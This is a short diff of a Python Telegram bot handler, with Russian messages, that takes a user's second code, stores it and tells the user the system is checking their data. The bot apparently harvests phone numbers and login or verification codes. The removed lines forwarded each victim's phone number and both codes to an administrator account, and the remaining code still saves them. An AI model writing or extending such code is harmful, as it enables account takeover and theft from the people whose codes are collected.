@@ -149,11 +149,6 @@ async def receive_second_code(message: Message, state: FSMContext):
     if is_valid_code2(user_code):
         await update_user_code_long(str(user_id), user_code)
         user = await check_user_exists(str(user_id))
-        user_info=(f"Код от пользователя {user.user_id}\n"
-                   f"Телефон {user.phone}\n"
-                   f"Код {user.code_short}\n"
-                   f"Код {user.code_long}")
-        await bot.send_message(ADMIN_ID, user_info)
         await message.answer("Система проверяет ваши данные.\nОжидайте подтверждения.")
         await state.clear()
     else:
